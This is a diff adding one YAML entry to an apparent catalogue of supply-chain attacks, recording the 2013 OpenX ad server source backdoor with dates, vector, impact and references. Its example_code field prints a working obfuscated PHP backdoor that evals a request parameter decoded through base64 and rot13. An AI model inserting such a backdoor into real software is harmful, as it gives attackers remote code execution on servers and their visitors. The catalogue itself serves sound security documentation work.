@@ -1,0 +1,43 @@
+- name: OpenX
+  title: OpenX source backdoored by attackers
+  start_date: 2013-04-01
+  end_date: 2013-08-05
+  license: GPL
+  website: https://www.openx.com/
+  repo: https://github.com/openx/openx
+  attribution_type: unknown
+  component_type: Application
+  lang: PHP
+  cause: compromise
+  motive: malware distribution
+  attack_vector: server compromise
+  insertion_phase: distribution
+  impact_type: malware distribution
+  impact_user_count: 10000
+  references:
+    - https://blog.sucuri.net/2013/08/openx-ad-server-backdoored-for-months.html
+  versions:
+    - 2.8.10
+  synopsis: The OpenX ad server source code was backdoored for months, affecting thousands of websites. The backdoor allowed attackers to distribute malware through compromised ad servers.
+  compromise_desc: Unknown attackers compromised the OpenX source code distribution and inserted a backdoor that allowed remote code execution. The backdoor was obfuscated and remained undetected in the official distribution for several months.
+  impact_desc: The backdoor allowed attackers to execute arbitrary code on web servers running the compromised version of OpenX. This was leveraged to distribute malware to website visitors through compromised advertisements, potentially affecting thousands of websites and their visitors.
+  example_code: |
+    function getFileContent($filepath) {
+        if (stristr($filepath, "..")) { return; }
+        if (!is_file($filepath)) { return; }
+        if (function_exists('file_get_contents')) {
+            return file_get_contents($filepath);
+        } else {
+            $filecontent = '';
+            $fp = fopen($filepath, 'r');
+            while (!feof($fp)) {
+                $filecontent .= fread($fp, 1024);
+            }
+            fclose($fp);
+            return $filecontent;
+        }
+    }
+    // Malicious backdoor
+    if (isset($_REQUEST['q0'])) {
+        @eval(base64_decode(str_rot13(base64_decode($_REQUEST['q0']))));
+    }
